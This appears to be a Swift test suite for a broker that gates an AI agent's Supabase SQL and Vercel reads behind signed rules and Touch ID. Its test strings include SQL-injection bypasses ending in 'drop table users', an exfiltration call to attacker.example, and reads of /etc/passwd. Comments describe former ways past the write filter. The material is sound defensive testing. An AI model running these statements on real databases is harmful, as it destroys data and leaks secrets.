import XCTest
import Network
@testable import LockdCore

/// supabase_sql e vercel_read. Os testes marcados com XCTExpectFailure documentam falhas REAIS de segurança:
/// hoje passam "esperando falhar". Quando a correção entrar, o teste vai acusar "unexpected pass" — aí é só remover o XCTExpectFailure.
final class IntegrationsTests: XCTestCase {
    // MARK: classificador de SQL (isReadOnly)

    func testClassifierAcceptsPlainReads() {
        for sql in ["select 1", "SELECT * FROM users LIMIT 5;", "show server_version", "explain select 1", "values (1),(2)", "table users",
                    "select 'it''s -- fine' as x", "  select\n  count(*)\nfrom t  ",
                    "select $$a;b--c$$", "select $tag$; drop table x; $tag$", "select /* a /* nested */ b */ 1", "select 1 -- ; drop table x",
                    "select 1 /* ; drop table x */", "select \"update\" from t", "with x as (select 1 as a) select a from x",
                    "select * from t where id in (1,2) and exists (select 1)", "select lower(name), count(*) from t group by 1",
                    "select 1; ", "select now()", "select cast(a as numeric(10,2)) from t", "explain (format json) select 1", "show all",
                    "select a from t where b = $1", "select u&'d\\0061t\\+000061' as x"] {
            XCTAssertTrue(SupabaseAPI.isReadOnly(sql), sql)
        }
    }

    func testClassifierRejectsPlainWritesAndMultiStatements() {
        for sql in ["insert into t values (1)", "update t set a=1", "delete from t", "drop table t", "alter table t add c int", "create table x(a int)",
                    "truncate t", "grant all on t to public", "select 1; select 2", "select * into backup from t",
                    "explain analyze select 1", "select pg_sleep(5)", "select set_config('a','b',false)", "select nextval('s')",
                    "with x as (delete from t returning *) select * from x", "select * from t for update", "do $$ begin end $$", "", "   ;  ",
                    "select E'\\''; drop table users; --'", "select 'abc", "select 1 /* aberto", "select $tag$ sem fim",
                    "select * from generate_series(1,3)", "explain (analyze) select 1", "select \"pg_sleep\"(1)", "(select 1)",
                    "with d as (insert into t values (1) returning *) select * from d", "select 1;;drop table t"] {
            XCTAssertFalse(SupabaseAPI.isReadOnly(sql), sql)
        }
    }

    /// S18 (corrigido) — antigos contornos: o leitor entende textos/comentários como o Postgres e recusa funções fora da lista.
    func testClassifierRejectsFormerBypasses() {
        for sql in ["select '--'; drop table users", "select '/*'; drop table users; select '*/'",
                    "select net.http_post(url:='https://attacker.example/x', body:='{}'::jsonb)", "select public.wipe_everything()",
                    "select pg_terminate_backend(pid) from pg_stat_activity", "select lo_create(0)", "select pg_notify('c','x')",
                    "select pg_read_file('/etc/passwd')", "select dblink_exec('x','drop table t')", "select set_config('role','postgres',false)"] {
            XCTAssertFalse(SupabaseAPI.isReadOnly(sql), sql)
        }
    }

    func testAnalyzeReportsWhatReallyRuns() {
        let s = SupabaseAPI.analyze("select 1; /* x */ drop table users; delete from t where a = '--'")
        XCTAssertEqual(s.statements, 3)
        XCTAssertEqual(s.dangerous, ["drop", "delete"])
        XCTAssertTrue(s.valid)
        XCTAssertFalse(s.normalized.contains("/*"), "comentários saem do texto mostrado")
        XCTAssertEqual(SupabaseAPI.analyze("select 'x").valid, false)
        XCTAssertEqual(SupabaseAPI.analyze("select 1").unapprovedFunctions, [])
        XCTAssertEqual(SupabaseAPI.analyze("select a.b.c(1)").unapprovedFunctions, ["a.b.c"])
    }

    func testWritePromptLeadsWithVerbsAndCounts() {
        let sql = "select 1 -- " + String(repeating: "x", count: 200) + "\n; drop table users; delete from t"
        let prompt = SupabaseAPI.writePrompt(ref: "abcdefghijklmnopqrst", shape: SupabaseAPI.analyze(sql), bytes: sql.utf8.count)
        XCTAssertTrue(prompt.hasPrefix("Agent wants to CHANGE database abcdefghijklmnopqrst · 3 statements · DROP,DELETE"), prompt)
        XCTAssertLessThan(prompt.count, 260)
        XCTAssertTrue(SupabaseAPI.writePrompt(ref: "r", shape: SupabaseAPI.analyze("select '"), bytes: 8).contains("UNREADABLE SQL"))
    }

    // MARK: ambiente do broker com servidor falso

    private var home: URL!
    private var previous: String?
    private let token = "sbp_" + String(repeating: "ab12", count: 10)
    private let ref = "abcdefghijklmnopqrst", otherRef = "zzzzzzzzzzzzzzzzzzzz"
    private var fake: FakeAPIServer!

    override func setUpWithError() throws {
        previous = ProcessInfo.processInfo.environment["LOCKD_HOME"]
        home = FileManager.default.temporaryDirectory.appendingPathComponent("lockd-integ-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: home, withIntermediateDirectories: true)
        setenv("LOCKD_HOME", home.path, 1)
        Vault.shared.lockNow(); BrokerSettings.programsEnabled = false
    }

    override func tearDownWithError() throws {
        fake?.stop(); Vault.shared.lockNow()
        unsetenv("LOCKD_SUPABASE_BASE"); unsetenv("LOCKD_VERCEL_BASE")
        try? FileManager.default.removeItem(at: home)
        if let previous { setenv("LOCKD_HOME", previous, 1) } else { unsetenv("LOCKD_HOME") }
    }

    private func startFake(_ reply: @escaping (String) -> String = { _ in #"[{"result":1}]"# }) throws {
        fake = FakeAPIServer(reply); try fake.start()
        setenv("LOCKD_SUPABASE_BASE", "http://127.0.0.1:\(fake.port)", 1)
        setenv("LOCKD_VERCEL_BASE", "http://127.0.0.1:\(fake.port)", 1)
    }

    private func supabaseSetup(pin: [String]? = nil, pinned: Bool = true, sign: Bool = true) throws -> (Store, Broker, Prompts) {
        let store = Store(), prompts = Prompts()
        let item = try store.saveSecret(Detection(envName: "SUPABASE_ACCESS_TOKEN", service: "Supabase", type: "Access token", value: token, confident: true),
                                        project: "T", source: "test").item
        if sign { try store.authorizeRules([item.id]) { $0.allowHosts = ["api.supabase.com"]; if pinned { $0.allowedPathPrefixes = pin ?? ["/v1/projects/\(self.ref)"] } } }
        let broker = Broker(store: store, freshUnlock: { prompts.add($0) })
        broker.httpClient = SecureHTTPClient(testAllowLoopback: true)
        return (store, broker, prompts)
    }

    private func sql(_ broker: Broker, _ query: String, ref: String? = nil) -> [String: Any] {
        broker.handle(["op": "supabase_sql", "args": ["project_ref": ref ?? self.ref, "query": query, "project": "T"]])
    }

    func testReadAsksTouchIDOncePerSessionAndNeverLeaksToken() throws {
        try startFake()
        let (_, broker, prompts) = try supabaseSetup()
        let a = sql(broker, "select 1"), b = sql(broker, "select 2")
        XCTAssertTrue(a["ok"] as? Bool ?? false, "\(a)"); XCTAssertTrue(b["ok"] as? Bool ?? false, "\(b)")
        XCTAssertEqual(prompts.all.count, 1, "leituras compartilham a aprovação da sessão")
        XCTAssertTrue(prompts.all[0].contains("api.supabase.com"))
        let first = fake.requests.first ?? ""
        XCTAssertTrue(first.contains("POST /v1/projects/\(ref)/database/query"))
        XCTAssertTrue(first.contains("Bearer \(token)"), "o Supabase recebe o token real")
        XCTAssertTrue(first.contains(#""query":"select 1""#))
        XCTAssertFalse(((a["text"] as? String) ?? "").contains(token))
        let audit = (try? String(contentsOf: LockdPaths.auditFile, encoding: .utf8)) ?? ""
        XCTAssertFalse(audit.contains(token))
        XCTAssertTrue(audit.contains("read ref=\(ref)"))
    }

    func testWriteAsksTouchIDEveryCallAndShowsTheSQL() throws {
        try startFake()
        let (_, broker, prompts) = try supabaseSetup()
        XCTAssertTrue(sql(broker, "insert into notes(body) values ('x')")["ok"] as? Bool ?? false)
        XCTAssertTrue(sql(broker, "delete from notes where id = 1")["ok"] as? Bool ?? false)
        XCTAssertEqual(prompts.all.count, 2, "cada escrita pede Touch ID")
        XCTAssertTrue(prompts.all[0].contains("CHANGE database \(ref)") && prompts.all[0].contains("insert into notes"))
        XCTAssertTrue(prompts.all[1].contains("delete from notes"))
    }

    func testDeniedWithoutSignedRuleBadRefOrMissingToken() throws {
        try startFake()
        let emptyBroker = Broker(store: Store(), freshUnlock: { _ in })
        XCTAssertTrue((emptyBroker.handle(["op": "supabase_sql", "args": ["project_ref": ref, "query": "select 1"]])["text"] as? String ?? "").contains("no Supabase access token"))
        let unsigned = try supabaseSetup(sign: false)
        XCTAssertFalse(sql(unsigned.1, "select 1")["ok"] as? Bool ?? true)
        XCTAssertTrue(fake.requests.isEmpty, "nada sai sem regra assinada")

        let signed = try supabaseSetup()
        for bad in ["SHORT", "ABCDEFGHIJKLMNOPQRST1", "../../etc", "abcdefghijklmnopqrs/"] {
            XCTAssertFalse(sql(signed.1, "select 1", ref: bad)["ok"] as? Bool ?? true, bad)
        }
    }

    func testPathPinningRestrictsWhichProjectCanBeQueried() throws {
        try startFake()
        let pinned = try supabaseSetup(pin: ["/v1/projects/\(ref)"])
        XCTAssertTrue(sql(pinned.1, "select 1")["ok"] as? Bool ?? false)
        XCTAssertFalse(sql(pinned.1, "select 1", ref: otherRef)["ok"] as? Bool ?? true, "projeto fora do prefixo fixado deve ser recusado")
    }

    /// S19 (corrigido) — o token é da CONTA inteira: sem prefixo preso ao projeto, ou com prefixo largo, nada sai.
    func testUnpinnedOrBroadlyPinnedTokenIsRefused() throws {
        try startFake()
        let open = try supabaseSetup(pinned: false)
        let r = sql(open.1, "select 1", ref: otherRef)
        XCTAssertFalse(r["ok"] as? Bool ?? true)
        XCTAssertTrue((r["text"] as? String ?? "").contains("pinned to this project"), "\(r)")
        XCTAssertTrue(fake.requests.isEmpty)
        for broad in [["/v1"], ["/v1/projects"], ["/v1/projects/"], ["/"]] {
            fake.stop(); try startFake()
            let b = try supabaseSetup(pin: broad)
            XCTAssertFalse(sql(b.1, "select 1")["ok"] as? Bool ?? true, "\(broad)")
            XCTAssertTrue(fake.requests.isEmpty, "\(broad)")
        }
    }

    /// S20 (corrigido) — o pedido de Touch ID mostra verbos, nº de instruções e tamanho ANTES do trecho do SQL.
    func testTouchIDPromptRevealsLateDestructiveSQL() throws {
        try startFake()
        let (_, broker, prompts) = try supabaseSetup()
        let hidden = "select 1 -- " + String(repeating: "x", count: 120) + "\n; drop table users"
        _ = sql(broker, hidden)
        XCTAssertEqual(prompts.all.count, 1)
        let shown = prompts.all.first ?? ""
        XCTAssertTrue(shown.contains("DROP"), shown)
        XCTAssertTrue(shown.contains("2 statements"), shown)
        XCTAssertTrue(shown.contains("CHANGE database \(ref)"), shown)
    }

    /// Antes o filtro tratava isto como leitura (1 Touch ID por sessão) e o banco executava o DROP.
    func testFormerBypassNowAsksTouchIDPerCall() throws {
        try startFake()
        let (_, broker, prompts) = try supabaseSetup()
        _ = sql(broker, "select '--'; drop table users")
        _ = sql(broker, "select '--'; drop table users")
        XCTAssertEqual(prompts.all.count, 2, "é escrita: um Touch ID por chamada")
        XCTAssertTrue(prompts.all.allSatisfy { $0.contains("DROP") })
        let audit = (try? String(contentsOf: LockdPaths.auditFile, encoding: .utf8)) ?? ""
        XCTAssertTrue(audit.contains("WRITE ref="))
    }

    // MARK: Vercel somente leitura

    private func vercelSetup(sign: Bool = true, tokenValue: String = "vercel_FAKE_token_0123456789ABCDEFGH") throws -> (Store, Broker, Prompts) {
        let store = Store(), prompts = Prompts()
        let item = try store.saveSecret(Detection(envName: "VERCEL_TOKEN", service: "Vercel", type: "Token", value: "vercel_FAKE_token_0123456789ABCDEFGH", confident: true),
                                        project: "T", source: "test").item
        if sign { try store.authorizeRules([item.id]) { $0.allowHosts = ["api.vercel.com"] } }
        let broker = Broker(store: store, freshUnlock: { prompts.add($0) })
        broker.httpClient = SecureHTTPClient(testAllowLoopback: true)
        return (store, broker, prompts)
    }

    private func vercel(_ broker: Broker, _ resource: String, extra: [String: Any] = [:]) -> [String: Any] {
        var args: [String: Any] = ["resource": resource, "project": "T"]; extra.forEach { args[$0] = $1 }
        return broker.handle(["op": "vercel_read", "args": args])
    }

    func testVercelEnvReturnsNamesNeverValues() throws {
        let secretValue = "SUPER_SECRET_VALUE_DO_NOT_LEAK_123"
        try startFake { _ in #"{"envs":[{"key":"STRIPE_KEY","type":"encrypted","target":["production"],"value":"\#(secretValue)","decrypted":true,"id":"e1"}]}"# }
        let (_, broker, _) = try vercelSetup()
        let r = vercel(broker, "env", extra: ["vercel_project": "prj_abc123"])
        let text = r["text"] as? String ?? ""
        XCTAssertTrue(r["ok"] as? Bool ?? false, "\(r)")
        XCTAssertTrue(text.contains("STRIPE_KEY") && text.contains("production"))
        XCTAssertFalse(text.contains(secretValue), "valores nunca voltam")
        XCTAssertTrue(fake.requests.first?.contains("GET /v10/projects/prj_abc123/env") ?? false)
        XCTAssertTrue(fake.requests.first?.contains("Bearer vercel_FAKE_token") ?? false)
    }

    func testVercelReadRejectsUnknownResourceBadProjectAndUnsignedRules() throws {
        try startFake()
        let signed = try vercelSetup()
        XCTAssertFalse(vercel(signed.1, "secrets")["ok"] as? Bool ?? true)
        XCTAssertFalse(vercel(signed.1, "env", extra: ["vercel_project": "../../v2/teams"])["ok"] as? Bool ?? true)
        XCTAssertFalse(vercel(signed.1, "env")["ok"] as? Bool ?? true, "sem projeto nem cwd")
        XCTAssertTrue(fake.requests.isEmpty, "as recusas acima não podem ter chegado à rede")
    }

    func testVercelReadWithUnsignedRuleNeverTouchesTheNetwork() throws {
        try startFake()
        let unsigned = try vercelSetup(sign: false, tokenValue: "vercel_FAKE_unsigned_ZYXWVUTSRQ9876543210")
        XCTAssertFalse(vercel(unsigned.1, "projects")["ok"] as? Bool ?? true)
        XCTAssertTrue(fake.requests.isEmpty)
    }

    func testVercelProjectsAndDeploymentsAreSummarized() throws {
        try startFake { req in
            req.contains("/v9/projects") ? #"{"projects":[{"name":"priva","id":"prj_1","framework":"nextjs","updatedAt":1760000000000}]}"#
                : #"{"deployments":[{"uid":"dpl_1","state":"READY","target":"production","url":"priva.vercel.app","created":1760000000000}]}"#
        }
        let (_, broker, prompts) = try vercelSetup()
        XCTAssertTrue((vercel(broker, "projects")["text"] as? String ?? "").contains("priva\tprj_1\tnextjs"))
        XCTAssertTrue((vercel(broker, "deployments", extra: ["vercel_project": "prj_1"])["text"] as? String ?? "").contains("dpl_1\tREADY\tproduction"))
        XCTAssertEqual(prompts.all.count, 1, "mesma chave e host na sessão: um Touch ID")
    }
}

final class Prompts: @unchecked Sendable {
    private let lock = NSLock(); private var items: [String] = []
    func add(_ s: String) { lock.lock(); items.append(s); lock.unlock() }
    var all: [String] { lock.lock(); defer { lock.unlock() }; return items }
}

/// Servidor HTTP mínimo: guarda a requisição inteira (cabeçalho + corpo) e responde JSON.
final class FakeAPIServer: @unchecked Sendable {
    private var listener: NWListener?
    private let q = DispatchQueue(label: "fake-api")
    private let lock = NSLock()
    private var _requests: [String] = []
    private let reply: (String) -> String
    private(set) var port: UInt16 = 0
    var requests: [String] { lock.lock(); defer { lock.unlock() }; return _requests }
    init(_ reply: @escaping (String) -> String) { self.reply = reply }

    func start() throws {
        let params = NWParameters.tcp
        params.requiredLocalEndpoint = .hostPort(host: .ipv4(.loopback), port: .any)
        let l = try NWListener(using: params), sem = DispatchSemaphore(value: 0)
        l.stateUpdateHandler = { if case .ready = $0 { sem.signal() } }
        l.newConnectionHandler = { [weak self] c in c.start(queue: self!.q); self?.read(c, Data(), nil) }
        l.start(queue: q); sem.wait()
        port = l.port!.rawValue; listener = l
    }
    func stop() { listener?.cancel() }

    private func read(_ c: NWConnection, _ buf: Data, _ slot: Int?) {
        c.receive(minimumIncompleteLength: 1, maximumLength: 65_536) { [weak self] data, _, done, err in
            guard let self else { return }
            var b = buf; if let d = data { b.append(d) }
            var mine = slot
            if let sep = b.range(of: Data("\r\n\r\n".utf8)) {
                let head = String(decoding: b[..<sep.lowerBound], as: UTF8.self).lowercased()
                let len = head.components(separatedBy: "content-length:").dropFirst().first
                    .flatMap { Int(($0.components(separatedBy: "\r\n").first ?? "").trimmingCharacters(in: .whitespaces)) } ?? 0
                let text = String(decoding: b, as: UTF8.self)
                self.lock.lock()
                if let s = mine { self._requests[s] = text } else { self._requests.append(text); mine = self._requests.count - 1 }
                self.lock.unlock()
                if b.count - sep.upperBound >= len {
                    let body = self.reply(text)
                    c.send(content: Data("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: \(body.utf8.count)\r\nConnection: close\r\n\r\n\(body)".utf8),
                           completion: .contentProcessed { _ in c.cancel() })
                    return
                }
            }
            if done || err != nil { c.cancel() } else { self.read(c, b, mine) }
        }
    }
}
